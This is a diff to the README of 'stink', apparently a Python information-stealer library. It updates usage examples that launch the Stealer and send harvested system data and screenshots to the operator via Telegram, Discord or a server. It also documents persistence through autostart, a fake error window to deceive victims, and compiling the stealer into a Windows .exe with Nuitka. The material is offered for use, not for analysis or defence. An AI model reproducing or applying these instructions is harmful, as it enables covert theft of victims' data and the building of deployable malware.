@@ -50,22 +50,20 @@ The `stink` already has an impressive functionality that will only expand.
 ### Standard
 ```python
 from stink import Stealer
-from stink.utils.senders import TelegramSender
+from stink.enums import Senders
 
 if __name__ == '__main__':
-    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
-
+    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
 ```
 ### Certain modules
 
 An example with only system data collection and screenshot.
 ```python
 from stink import Stealer
-from stink.enums import Features
-from stink.utils.senders import TelegramSender
+from stink.enums import Features, Senders
 
 if __name__ == '__main__':
-    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
+    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
 ```
 ### Additional parameters
 
@@ -101,6 +99,15 @@ if __name__ == '__main__':
   - `autostart` - adding to autostart.
 
   - `message` - showing a fake error window.
+
+
+- `senders` - launches sending methods from the list. Sending methods can be imported from `stink.enums.Senders`. Available sending methods:
+
+  - `server` - Send to server.
+
+  - `telegram` - sending to Telegram.
+
+  - `discord` - sending to Discord.
   
 ## Creating exe
 Python is an interpreted programming language, so we first translate it into C and then compile it into an .exe file.
@@ -113,10 +120,10 @@ We will need Nuitka to do this.
 3. Create test.py (or any other name) file in the same directory with the following code:
 ```python
 from stink import Stealer
-from stink.utils.senders import TelegramSender
+from stink.enums import Senders
 
 if __name__ == '__main__':
-    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
+    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
 ```
 
 #### With BAT
